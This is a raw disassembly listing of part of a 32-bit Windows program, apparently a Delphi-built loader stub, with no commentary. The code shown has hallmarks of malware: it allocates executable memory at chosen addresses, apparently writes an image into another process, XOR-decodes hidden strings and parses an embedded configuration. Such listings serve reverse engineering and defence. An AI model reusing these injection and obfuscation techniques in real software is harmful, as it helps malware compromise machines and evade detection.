  40413d:	be 00 00 00 10       	mov    $0x10000000,%esi
  404142:	81 c6 00 00 01 00    	add    $0x10000,%esi
  404148:	6a 40                	push   $0x40
  40414a:	68 00 30 00 00       	push   $0x3000
  40414f:	8b 47 50             	mov    0x50(%edi),%eax
  404152:	50                   	push   %eax
  404153:	8b 47 34             	mov    0x34(%edi),%eax
  404156:	03 c6                	add    %esi,%eax
  404158:	50                   	push   %eax
  404159:	e8 22 f5 ff ff       	call   0x403680
  40415e:	8b d8                	mov    %eax,%ebx
  404160:	85 db                	test   %ebx,%ebx
  404162:	74 29                	je     0x40418d
  404164:	68 00 80 00 00       	push   $0x8000
  404169:	6a 00                	push   $0x0
  40416b:	53                   	push   %ebx
  40416c:	e8 1f f5 ff ff       	call   0x403690
  404171:	6a 40                	push   $0x40
  404173:	68 00 30 00 00       	push   $0x3000
  404178:	8b 47 50             	mov    0x50(%edi),%eax
  40417b:	50                   	push   %eax
  40417c:	8b 47 34             	mov    0x34(%edi),%eax
  40417f:	03 c6                	add    %esi,%eax
  404181:	50                   	push   %eax
  404182:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404185:	50                   	push   %eax
  404186:	e8 fd f4 ff ff       	call   0x403688
  40418b:	8b d8                	mov    %eax,%ebx
  40418d:	85 db                	test   %ebx,%ebx
  40418f:	75 08                	jne    0x404199
  404191:	81 fe 00 00 00 30    	cmp    $0x30000000,%esi
  404197:	76 a9                	jbe    0x404142
  404199:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40419c:	50                   	push   %eax
  40419d:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4041a0:	8b d3                	mov    %ebx,%edx
  4041a2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4041a5:	e8 16 fd ff ff       	call   0x403ec0
  4041aa:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4041ad:	85 c0                	test   %eax,%eax
  4041af:	74 38                	je     0x4041e9
  4041b1:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4041b4:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4041b7:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4041ba:	8d 55 e8             	lea    -0x18(%ebp),%edx
  4041bd:	52                   	push   %edx
  4041be:	8b 55 d8             	mov    -0x28(%ebp),%edx
  4041c1:	52                   	push   %edx
  4041c2:	50                   	push   %eax
  4041c3:	53                   	push   %ebx
  4041c4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4041c7:	50                   	push   %eax
  4041c8:	e8 f3 f4 ff ff       	call   0x4036c0
  4041cd:	6a 08                	push   $0x8
  4041cf:	6a 00                	push   $0x0
  4041d1:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4041d4:	ba cc 40 40 00       	mov    $0x4040cc,%edx
  4041d9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4041dc:	e8 cb f6 ff ff       	call   0x4038ac
  4041e1:	85 c0                	test   %eax,%eax
  4041e3:	74 04                	je     0x4041e9
  4041e5:	c6 45 f7 01          	movb   $0x1,-0x9(%ebp)
  4041e9:	33 c0                	xor    %eax,%eax
  4041eb:	5a                   	pop    %edx
  4041ec:	59                   	pop    %ecx
  4041ed:	59                   	pop    %ecx
  4041ee:	64 89 10             	mov    %edx,%fs:(%eax)
  4041f1:	68 0c 42 40 00       	push   $0x40420c
  4041f6:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4041f9:	8b 15 bc 37 40 00    	mov    0x4037bc,%edx
  4041ff:	e8 ec e2 ff ff       	call   0x4024f0
  404204:	c3                   	ret
  404205:	e9 02 d6 ff ff       	jmp    0x40180c
  40420a:	eb ea                	jmp    0x4041f6
  40420c:	8a 45 f7             	mov    -0x9(%ebp),%al
  40420f:	5f                   	pop    %edi
  404210:	5e                   	pop    %esi
  404211:	5b                   	pop    %ebx
  404212:	8b e5                	mov    %ebp,%esp
  404214:	5d                   	pop    %ebp
  404215:	c3                   	ret
  404216:	8b c0                	mov    %eax,%eax
  404218:	55                   	push   %ebp
  404219:	8b ec                	mov    %esp,%ebp
  40421b:	33 c0                	xor    %eax,%eax
  40421d:	55                   	push   %ebp
  40421e:	68 3d 42 40 00       	push   $0x40423d
  404223:	64 ff 30             	push   %fs:(%eax)
  404226:	64 89 20             	mov    %esp,%fs:(%eax)
  404229:	ff 05 84 e6 40 00    	incl   0x40e684
  40422f:	33 c0                	xor    %eax,%eax
  404231:	5a                   	pop    %edx
  404232:	59                   	pop    %ecx
  404233:	59                   	pop    %ecx
  404234:	64 89 10             	mov    %edx,%fs:(%eax)
  404237:	68 44 42 40 00       	push   $0x404244
  40423c:	c3                   	ret
  40423d:	e9 ca d5 ff ff       	jmp    0x40180c
  404242:	eb f8                	jmp    0x40423c
  404244:	5d                   	pop    %ebp
  404245:	c3                   	ret
  404246:	8b c0                	mov    %eax,%eax
  404248:	83 2d 84 e6 40 00 01 	subl   $0x1,0x40e684
  40424f:	c3                   	ret
  404250:	54                   	push   %esp
  404251:	42                   	inc    %edx
  404252:	40                   	inc    %eax
  404253:	00 11                	add    %dl,(%ecx)
  404255:	06                   	push   %es
  404256:	53                   	push   %ebx
  404257:	41                   	inc    %ecx
  404258:	72 72                	jb     0x4042cc
  40425a:	61                   	popa
  40425b:	79 04                	jns    0x404261
  40425d:	00 00                	add    %al,(%eax)
  40425f:	00 14 10             	add    %dl,(%eax,%edx,1)
  404262:	40                   	inc    %eax
  404263:	00 48 00             	add    %cl,0x0(%eax)
  404266:	00 00                	add    %al,(%eax)
  404268:	14 10                	adc    $0x10,%al
  40426a:	40                   	inc    %eax
  40426b:	00 07                	add    %al,(%edi)
  40426d:	45                   	inc    %ebp
  40426e:	64 69 74 53 76 72 c0 	imul   $0x4042c072,%fs:0x76(%ebx,%edx,2),%esi
  404275:	42 40 
	...
  40427f:	00 c0                	add    %al,%al
  404281:	42                   	inc    %edx
  404282:	40                   	inc    %eax
	...
  404293:	00 d2                	add    %dl,%dl
  404295:	42                   	inc    %edx
  404296:	40                   	inc    %eax
  404297:	00 08                	add    %cl,(%eax)
  404299:	00 00                	add    %al,(%eax)
  40429b:	00 20                	add    %ah,(%eax)
  40429d:	10 40 00             	adc    %al,0x0(%eax)
  4042a0:	5c                   	pop    %esp
  4042a1:	15 40 00 68 15       	adc    $0x15680040,%eax
  4042a6:	40                   	inc    %eax
  4042a7:	00 6c 15 40          	add    %ch,0x40(%ebp,%edx,1)
  4042ab:	00 70 15             	add    %dh,0x15(%eax)
  4042ae:	40                   	inc    %eax
  4042af:	00 64 15 40          	add    %ah,0x40(%ebp,%edx,1)
  4042b3:	00 40 14             	add    %al,0x14(%eax)
  4042b6:	40                   	inc    %eax
  4042b7:	00 5c 14 40          	add    %bl,0x40(%esp,%edx,1)
  4042bb:	00 98 14 40 00 0e    	add    %bl,0xe004014(%eax)
  4042c1:	00 00                	add    %al,(%eax)
  4042c3:	00 00                	add    %al,(%eax)
  4042c5:	00 01                	add    %al,(%ecx)
  4042c7:	00 00                	add    %al,(%eax)
  4042c9:	00 50 42             	add    %dl,0x42(%eax)
  4042cc:	40                   	inc    %eax
  4042cd:	00 04 00             	add    %al,(%eax,%eax,1)
  4042d0:	00 00                	add    %al,(%eax)
  4042d2:	07                   	pop    %es
  4042d3:	54                   	push   %esp
  4042d4:	4c                   	dec    %esp
  4042d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4042d6:	61                   	popa
  4042d7:	64 65 72 8b          	fs gs jb 0x404266
  4042db:	c0 55 8b ec          	rclb   $0xec,-0x75(%ebp)
  4042df:	51                   	push   %ecx
  4042e0:	53                   	push   %ebx
  4042e1:	56                   	push   %esi
  4042e2:	57                   	push   %edi
  4042e3:	8b fa                	mov    %edx,%edi
  4042e5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4042e8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4042eb:	e8 48 dc ff ff       	call   0x401f38
  4042f0:	33 c0                	xor    %eax,%eax
  4042f2:	55                   	push   %ebp
  4042f3:	68 4b 43 40 00       	push   $0x40434b
  4042f8:	64 ff 30             	push   %fs:(%eax)
  4042fb:	64 89 20             	mov    %esp,%fs:(%eax)
  4042fe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404301:	e8 4a da ff ff       	call   0x401d50
  404306:	8b f0                	mov    %eax,%esi
  404308:	85 f6                	test   %esi,%esi
  40430a:	7e 1f                	jle    0x40432b
  40430c:	bb 01 00 00 00       	mov    $0x1,%ebx
  404311:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404314:	e8 83 dc ff ff       	call   0x401f9c
  404319:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40431c:	8a 54 1a ff          	mov    -0x1(%edx,%ebx,1),%dl
  404320:	80 f2 bc             	xor    $0xbc,%dl
  404323:	88 54 18 ff          	mov    %dl,-0x1(%eax,%ebx,1)
  404327:	43                   	inc    %ebx
  404328:	4e                   	dec    %esi
  404329:	75 e6                	jne    0x404311
  40432b:	8b c7                	mov    %edi,%eax
  40432d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404330:	e8 df d7 ff ff       	call   0x401b14
  404335:	33 c0                	xor    %eax,%eax
  404337:	5a                   	pop    %edx
  404338:	59                   	pop    %ecx
  404339:	59                   	pop    %ecx
  40433a:	64 89 10             	mov    %edx,%fs:(%eax)
  40433d:	68 52 43 40 00       	push   $0x404352
  404342:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404345:	e8 76 d7 ff ff       	call   0x401ac0
  40434a:	c3                   	ret
  40434b:	e9 bc d4 ff ff       	jmp    0x40180c
  404350:	eb f0                	jmp    0x404342
  404352:	5f                   	pop    %edi
  404353:	5e                   	pop    %esi
  404354:	5b                   	pop    %ebx
  404355:	59                   	pop    %ecx
  404356:	5d                   	pop    %ebp
  404357:	c3                   	ret
  404358:	55                   	push   %ebp
  404359:	8b ec                	mov    %esp,%ebp
  40435b:	83 c4 f0             	add    $0xfffffff0,%esp
  40435e:	53                   	push   %ebx
  40435f:	56                   	push   %esi
  404360:	57                   	push   %edi
  404361:	33 db                	xor    %ebx,%ebx
  404363:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  404366:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  404369:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40436c:	8b fa                	mov    %edx,%edi
  40436e:	8b d8                	mov    %eax,%ebx
  404370:	33 c0                	xor    %eax,%eax
  404372:	55                   	push   %ebp
  404373:	68 51 44 40 00       	push   $0x404451
  404378:	64 ff 30             	push   %fs:(%eax)
  40437b:	64 89 20             	mov    %esp,%fs:(%eax)
  40437e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404381:	8b d3                	mov    %ebx,%edx
  404383:	e8 d0 d7 ff ff       	call   0x401b58
  404388:	33 f6                	xor    %esi,%esi
  40438a:	8b c7                	mov    %edi,%eax
  40438c:	e8 bf d9 ff ff       	call   0x401d50
  404391:	48                   	dec    %eax
  404392:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404395:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404398:	8b c7                	mov    %edi,%eax
  40439a:	e8 8d dc ff ff       	call   0x40202c
  40439f:	8b d8                	mov    %eax,%ebx
  4043a1:	85 db                	test   %ebx,%ebx
  4043a3:	74 44                	je     0x4043e9
  4043a5:	46                   	inc    %esi
  4043a6:	56                   	push   %esi
  4043a7:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4043aa:	b9 01 00 00 00       	mov    $0x1,%ecx
  4043af:	8b 15 50 42 40 00    	mov    0x404250,%edx
  4043b5:	e8 02 ec ff ff       	call   0x402fbc
  4043ba:	83 c4 04             	add    $0x4,%esp
  4043bd:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4043c0:	8d 44 b0 fc          	lea    -0x4(%eax,%esi,4),%eax
  4043c4:	50                   	push   %eax
  4043c5:	8b cb                	mov    %ebx,%ecx
  4043c7:	49                   	dec    %ecx
  4043c8:	ba 01 00 00 00       	mov    $0x1,%edx
  4043cd:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4043d0:	e8 cf db ff ff       	call   0x401fa4
  4043d5:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4043d8:	03 cb                	add    %ebx,%ecx
  4043da:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4043dd:	ba 01 00 00 00       	mov    $0x1,%edx
  4043e2:	e8 fd db ff ff       	call   0x401fe4
  4043e7:	eb ac                	jmp    0x404395
  4043e9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4043ec:	e8 5f d9 ff ff       	call   0x401d50
  4043f1:	85 c0                	test   %eax,%eax
  4043f3:	7e 27                	jle    0x40441c
  4043f5:	46                   	inc    %esi
  4043f6:	56                   	push   %esi
  4043f7:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4043fa:	b9 01 00 00 00       	mov    $0x1,%ecx
  4043ff:	8b 15 50 42 40 00    	mov    0x404250,%edx
  404405:	e8 b2 eb ff ff       	call   0x402fbc
  40440a:	83 c4 04             	add    $0x4,%esp
  40440d:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404410:	8d 44 b0 fc          	lea    -0x4(%eax,%esi,4),%eax
  404414:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404417:	e8 f8 d6 ff ff       	call   0x401b14
  40441c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40441f:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404422:	8b 0d 50 42 40 00    	mov    0x404250,%ecx
  404428:	e8 d7 eb ff ff       	call   0x403004
  40442d:	33 c0                	xor    %eax,%eax
  40442f:	5a                   	pop    %edx
  404430:	59                   	pop    %ecx
  404431:	59                   	pop    %ecx
  404432:	64 89 10             	mov    %edx,%fs:(%eax)
  404435:	68 58 44 40 00       	push   $0x404458
  40443a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40443d:	8b 15 50 42 40 00    	mov    0x404250,%edx
  404443:	e8 80 eb ff ff       	call   0x402fc8
  404448:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40444b:	e8 70 d6 ff ff       	call   0x401ac0
  404450:	c3                   	ret
  404451:	e9 b6 d3 ff ff       	jmp    0x40180c
  404456:	eb e2                	jmp    0x40443a
  404458:	5f                   	pop    %edi
  404459:	5e                   	pop    %esi
  40445a:	5b                   	pop    %ebx
  40445b:	8b e5                	mov    %ebp,%esp
  40445d:	5d                   	pop    %ebp
  40445e:	c3                   	ret
  40445f:	90                   	nop
  404460:	53                   	push   %ebx
  404461:	56                   	push   %esi
  404462:	57                   	push   %edi
  404463:	55                   	push   %ebp
  404464:	8b e8                	mov    %eax,%ebp
  404466:	6a 0a                	push   $0xa
  404468:	68 c8 44 40 00       	push   $0x4044c8
  40446d:	a1 70 e6 40 00       	mov    0x40e670,%eax
  404472:	50                   	push   %eax
  404473:	e8 40 f1 ff ff       	call   0x4035b8
  404478:	8b d8                	mov    %eax,%ebx
  40447a:	53                   	push   %ebx
  40447b:	a1 70 e6 40 00       	mov    0x40e670,%eax
  404480:	50                   	push   %eax
  404481:	e8 ea f1 ff ff       	call   0x403670
  404486:	8b f8                	mov    %eax,%edi
  404488:	53                   	push   %ebx
  404489:	a1 70 e6 40 00       	mov    0x40e670,%eax
  40448e:	50                   	push   %eax
  40448f:	e8 a4 f1 ff ff       	call   0x403638
  404494:	8b d8                	mov    %eax,%ebx
  404496:	53                   	push   %ebx
  404497:	e8 a4 f1 ff ff       	call   0x403640
  40449c:	8b f0                	mov    %eax,%esi
  40449e:	85 f6                	test   %esi,%esi
  4044a0:	74 20                	je     0x4044c2
  4044a2:	8b d7                	mov    %edi,%edx
  4044a4:	4a                   	dec    %edx
  4044a5:	8b c5                	mov    %ebp,%eax
  4044a7:	e8 c8 db ff ff       	call   0x402074
  4044ac:	8b c5                	mov    %ebp,%eax
  4044ae:	e8 e9 da ff ff       	call   0x401f9c
  4044b3:	8b cf                	mov    %edi,%ecx
  4044b5:	8b d6                	mov    %esi,%edx
  4044b7:	e8 74 f2 ff ff       	call   0x403730
  4044bc:	53                   	push   %ebx
  4044bd:	e8 06 f1 ff ff       	call   0x4035c8
  4044c2:	5d                   	pop    %ebp
  4044c3:	5f                   	pop    %edi
  4044c4:	5e                   	pop    %esi
  4044c5:	5b                   	pop    %ebx
  4044c6:	c3                   	ret
  4044c7:	00 58 58             	add    %bl,0x58(%eax)
  4044ca:	2d 58 58 2d 58       	sub    $0x582d5858,%eax
  4044cf:	58                   	pop    %eax
  4044d0:	2d 58 58 00 55       	sub    $0x55005858,%eax
  4044d5:	8b ec                	mov    %esp,%ebp
  4044d7:	6a 00                	push   $0x0
  4044d9:	6a 00                	push   $0x0
  4044db:	6a 00                	push   $0x0
  4044dd:	53                   	push   %ebx
  4044de:	56                   	push   %esi
  4044df:	57                   	push   %edi
  4044e0:	8b f0                	mov    %eax,%esi
  4044e2:	33 c0                	xor    %eax,%eax
  4044e4:	55                   	push   %ebp
  4044e5:	68 9b 45 40 00       	push   $0x40459b
  4044ea:	64 ff 30             	push   %fs:(%eax)
  4044ed:	64 89 20             	mov    %esp,%fs:(%eax)
  4044f0:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4044f3:	e8 68 ff ff ff       	call   0x404460
  4044f8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4044fb:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4044fe:	ba b4 45 40 00       	mov    $0x4045b4,%edx
  404503:	e8 50 fe ff ff       	call   0x404358
  404508:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40450b:	8d 46 04             	lea    0x4(%esi),%eax
  40450e:	8b 0d 50 42 40 00    	mov    0x404250,%ecx
  404514:	e8 eb ea ff ff       	call   0x403004
  404519:	8b 46 04             	mov    0x4(%esi),%eax
  40451c:	e8 e7 e8 ff ff       	call   0x402e08
  404521:	8b f8                	mov    %eax,%edi
  404523:	85 ff                	test   %edi,%edi
  404525:	7c 4b                	jl     0x404572
  404527:	47                   	inc    %edi
  404528:	33 db                	xor    %ebx,%ebx
  40452a:	8b 46 04             	mov    0x4(%esi),%eax
  40452d:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  404531:	74 30                	je     0x404563
  404533:	8b 46 04             	mov    0x4(%esi),%eax
  404536:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  404539:	ba c8 45 40 00       	mov    $0x4045c8,%edx
  40453e:	e8 51 d9 ff ff       	call   0x401e94
  404543:	74 1e                	je     0x404563
  404545:	8d 55 f4             	lea    -0xc(%ebp),%edx
  404548:	8b 46 04             	mov    0x4(%esi),%eax
  40454b:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  40454e:	e8 89 fd ff ff       	call   0x4042dc
  404553:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404556:	8b 46 04             	mov    0x4(%esi),%eax
  404559:	8d 04 98             	lea    (%eax,%ebx,4),%eax
  40455c:	e8 b3 d5 ff ff       	call   0x401b14
  404561:	eb 0b                	jmp    0x40456e
  404563:	8b 46 04             	mov    0x4(%esi),%eax
  404566:	8d 04 98             	lea    (%eax,%ebx,4),%eax
  404569:	e8 52 d5 ff ff       	call   0x401ac0
  40456e:	43                   	inc    %ebx
  40456f:	4f                   	dec    %edi
  404570:	75 b8                	jne    0x40452a
  404572:	33 c0                	xor    %eax,%eax
  404574:	5a                   	pop    %edx
  404575:	59                   	pop    %ecx
  404576:	59                   	pop    %ecx
  404577:	64 89 10             	mov    %edx,%fs:(%eax)
  40457a:	68 a2 45 40 00       	push   $0x4045a2
  40457f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404582:	ba 02 00 00 00       	mov    $0x2,%edx
  404587:	e8 58 d5 ff ff       	call   0x401ae4
  40458c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40458f:	8b 15 50 42 40 00    	mov    0x404250,%edx
  404595:	e8 2e ea ff ff       	call   0x402fc8
  40459a:	c3                   	ret
  40459b:	e9 6c d2 ff ff       	jmp    0x40180c
  4045a0:	eb dd                	jmp    0x40457f
  4045a2:	5f                   	pop    %edi
  4045a3:	5e                   	pop    %esi
  4045a4:	5b                   	pop    %ebx
  4045a5:	8b e5                	mov    %ebp,%esp
  4045a7:	5d                   	pop    %ebp
  4045a8:	c3                   	ret
  4045a9:	00 00                	add    %al,(%eax)
  4045ab:	00 ff                	add    %bh,%bh
  4045ad:	ff                   	(bad)
  4045ae:	ff                   	(bad)
  4045af:	ff 09                	decl   (%ecx)
  4045b1:	00 00                	add    %al,(%eax)
  4045b3:	00 23                	add    %ah,(%ebx)
  4045b5:	23 23                	and    (%ebx),%esp
  4045b7:	23 40 23             	and    0x23(%eax),%eax
  4045ba:	23 23                	and    (%ebx),%esp
  4045bc:	23 00                	and    (%eax),%eax
  4045be:	00 00                	add    %al,(%eax)
  4045c0:	ff                   	(bad)
  4045c1:	ff                   	(bad)
  4045c2:	ff                   	(bad)
  4045c3:	ff 01                	incl   (%ecx)
  4045c5:	00 00                	add    %al,(%eax)
  4045c7:	00 20                	add    %ah,(%eax)
  4045c9:	00 00                	add    %al,(%eax)
  4045cb:	00 55 8b             	add    %dl,-0x75(%ebp)
  4045ce:	ec                   	in     (%dx),%al
  4045cf:	33 c0                	xor    %eax,%eax
  4045d1:	55                   	push   %ebp
  4045d2:	68 f1 45 40 00       	push   $0x4045f1
  4045d7:	64 ff 30             	push   %fs:(%eax)
  4045da:	64 89 20             	mov    %esp,%fs:(%eax)
  4045dd:	ff 05 88 e6 40 00    	incl   0x40e688
  4045e3:	33 c0                	xor    %eax,%eax
  4045e5:	5a                   	pop    %edx
  4045e6:	59                   	pop    %ecx
  4045e7:	59                   	pop    %ecx
  4045e8:	64 89 10             	mov    %edx,%fs:(%eax)
  4045eb:	68 f8 45 40 00       	push   $0x4045f8
  4045f0:	c3                   	ret
  4045f1:	e9 16 d2 ff ff       	jmp    0x40180c
  4045f6:	eb f8                	jmp    0x4045f0
  4045f8:	5d                   	pop    %ebp
  4045f9:	c3                   	ret
  4045fa:	8b c0                	mov    %eax,%eax
  4045fc:	83 2d 88 e6 40 00 01 	subl   $0x1,0x40e688
  404603:	c3                   	ret
  404604:	53                   	push   %ebx
  404605:	56                   	push   %esi
  404606:	57                   	push   %edi
  404607:	b2 01                	mov    $0x1,%dl
  404609:	a1 74 42 40 00       	mov    0x404274,%eax
  40460e:	e8 65 ce ff ff       	call   0x401478
  404613:	8b f8                	mov    %eax,%edi
  404615:	8b c7                	mov    %edi,%eax
  404617:	e8 b8 fe ff ff       	call   0x4044d4
  40461c:	33 f6                	xor    %esi,%esi
  40461e:	bb 8c e6 40 00       	mov    $0x40e68c,%ebx
  404623:	8b c3                	mov    %ebx,%eax
  404625:	8b 57 04             	mov    0x4(%edi),%edx
  404628:	8b 14 b2             	mov    (%edx,%esi,4),%edx
  40462b:	e8 e4 d4 ff ff       	call   0x401b14
  404630:	46                   	inc    %esi
  404631:	83 c3 04             	add    $0x4,%ebx
  404634:	83 fe 65             	cmp    $0x65,%esi
  404637:	75 ea                	jne    0x404623
  404639:	8b c7                	mov    %edi,%eax
  40463b:	e8 68 ce ff ff       	call   0x4014a8
  404640:	5f                   	pop    %edi
  404641:	5e                   	pop    %esi
  404642:	5b                   	pop    %ebx
  404643:	c3                   	ret
  404644:	55                   	push   %ebp
  404645:	8b ec                	mov    %esp,%ebp
  404647:	33 c0                	xor    %eax,%eax
  404649:	55                   	push   %ebp
  40464a:	68 90 46 40 00       	push   $0x404690
  40464f:	64 ff 30             	push   %fs:(%eax)
  404652:	64 89 20             	mov    %esp,%fs:(%eax)
  404655:	ff 05 20 e8 40 00    	incl   0x40e820
  40465b:	75 25                	jne    0x404682
  40465d:	b8 24 e8 40 00       	mov    $0x40e824,%eax
  404662:	8b 15 50 42 40 00    	mov    0x404250,%edx
  404668:	e8 5b e9 ff ff       	call   0x402fc8
  40466d:	b8 8c e6 40 00       	mov    $0x40e68c,%eax
  404672:	b9 65 00 00 00       	mov    $0x65,%ecx
  404677:	8b 15 14 10 40 00    	mov    0x401014,%edx
  40467d:	e8 a2 de ff ff       	call   0x402524
  404682:	33 c0                	xor    %eax,%eax
  404684:	5a                   	pop    %edx
  404685:	59                   	pop    %ecx
  404686:	59                   	pop    %ecx
  404687:	64 89 10             	mov    %edx,%fs:(%eax)
  40468a:	68 97 46 40 00       	push   $0x404697
  40468f:	c3                   	ret
  404690:	e9 77 d1 ff ff       	jmp    0x40180c
  404695:	eb f8                	jmp    0x40468f
  404697:	5d                   	pop    %ebp
  404698:	c3                   	ret
  404699:	8d 40 00             	lea    0x0(%eax),%eax
  40469c:	83 2d 20 e8 40 00 01 	subl   $0x1,0x40e820
  4046a3:	c3                   	ret
  4046a4:	53                   	push   %ebx
  4046a5:	56                   	push   %esi
  4046a6:	57                   	push   %edi
  4046a7:	51                   	push   %ecx
  4046a8:	89 14 24             	mov    %edx,(%esp)
  4046ab:	8b f0                	mov    %eax,%esi
  4046ad:	8b c6                	mov    %esi,%eax
  4046af:	e8 9c d6 ff ff       	call   0x401d50
  4046b4:	8b f8                	mov    %eax,%edi
  4046b6:	8b df                	mov    %edi,%ebx
  4046b8:	83 fb 01             	cmp    $0x1,%ebx
  4046bb:	7c 25                	jl     0x4046e2
  4046bd:	8a 44 1e ff          	mov    -0x1(%esi,%ebx,1),%al
  4046c1:	3c 5c                	cmp    $0x5c,%al
  4046c3:	74 04                	je     0x4046c9
  4046c5:	3c 2f                	cmp    $0x2f,%al
  4046c7:	75 14                	jne    0x4046dd
  4046c9:	8b 04 24             	mov    (%esp),%eax
  4046cc:	50                   	push   %eax
  4046cd:	8b cf                	mov    %edi,%ecx
  4046cf:	2b cb                	sub    %ebx,%ecx
  4046d1:	8d 53 01             	lea    0x1(%ebx),%edx
  4046d4:	8b c6                	mov    %esi,%eax
  4046d6:	e8 c9 d8 ff ff       	call   0x401fa4
  4046db:	eb 05                	jmp    0x4046e2
  4046dd:	4b                   	dec    %ebx
  4046de:	85 db                	test   %ebx,%ebx
  4046e0:	75 db                	jne    0x4046bd
  4046e2:	5a                   	pop    %edx
  4046e3:	5f                   	pop    %edi
  4046e4:	5e                   	pop    %esi
  4046e5:	5b                   	pop    %ebx
  4046e6:	c3                   	ret
  4046e7:	90                   	nop
  4046e8:	55                   	push   %ebp
  4046e9:	8b ec                	mov    %esp,%ebp
  4046eb:	83 c4 ec             	add    $0xffffffec,%esp
  4046ee:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4046f1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4046f4:	e8 3f d8 ff ff       	call   0x401f38
  4046f9:	33 c0                	xor    %eax,%eax
  4046fb:	55                   	push   %ebp
  4046fc:	68 2e 47 40 00       	push   $0x40472e
  404701:	64 ff 30             	push   %fs:(%eax)
  404704:	64 89 20             	mov    %esp,%fs:(%eax)
  404707:	8d 55 ec             	lea    -0x14(%ebp),%edx
  40470a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40470d:	e8 ca e4 ff ff       	call   0x402bdc
  404712:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404715:	89 55 f4             	mov    %edx,-0xc(%ebp)
  404718:	33 c0                	xor    %eax,%eax
  40471a:	5a                   	pop    %edx
  40471b:	59                   	pop    %ecx
  40471c:	59                   	pop    %ecx
  40471d:	64 89 10             	mov    %edx,%fs:(%eax)
  404720:	68 35 47 40 00       	push   $0x404735
  404725:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404728:	e8 93 d3 ff ff       	call   0x401ac0
  40472d:	c3                   	ret
  40472e:	e9 d9 d0 ff ff       	jmp    0x40180c
  404733:	eb f0                	jmp    0x404725
  404735:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404738:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40473b:	8b e5                	mov    %ebp,%esp
  40473d:	5d                   	pop    %ebp
  40473e:	c3                   	ret
  40473f:	90                   	nop
  404740:	55                   	push   %ebp
  404741:	8b ec                	mov    %esp,%ebp
  404743:	51                   	push   %ecx
  404744:	53                   	push   %ebx
  404745:	56                   	push   %esi
  404746:	57                   	push   %edi
  404747:	8b fa                	mov    %edx,%edi
  404749:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40474c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40474f:	e8 e4 d7 ff ff       	call   0x401f38
  404754:	33 c0                	xor    %eax,%eax
  404756:	55                   	push   %ebp
  404757:	68 b5 47 40 00       	push   $0x4047b5
  40475c:	64 ff 30             	push   %fs:(%eax)
  40475f:	64 89 20             	mov    %esp,%fs:(%eax)
  404762:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404765:	e8 e6 d5 ff ff       	call   0x401d50
  40476a:	8b f0                	mov    %eax,%esi
  40476c:	85 f6                	test   %esi,%esi
  40476e:	7e 25                	jle    0x404795
  404770:	bb 01 00 00 00       	mov    $0x1,%ebx
  404775:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404778:	0f b6 44 18 ff       	movzbl -0x1(%eax,%ebx,1),%eax
  40477d:	50                   	push   %eax
  40477e:	e8 5d ef ff ff       	call   0x4036e0
  404783:	50                   	push   %eax
  404784:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404787:	e8 10 d8 ff ff       	call   0x401f9c
  40478c:	5a                   	pop    %edx
  40478d:	88 54 18 ff          	mov    %dl,-0x1(%eax,%ebx,1)
  404791:	43                   	inc    %ebx
  404792:	4e                   	dec    %esi
  404793:	75 e0                	jne    0x404775
  404795:	8b c7                	mov    %edi,%eax
  404797:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40479a:	e8 75 d3 ff ff       	call   0x401b14
  40479f:	33 c0                	xor    %eax,%eax
  4047a1:	5a                   	pop    %edx
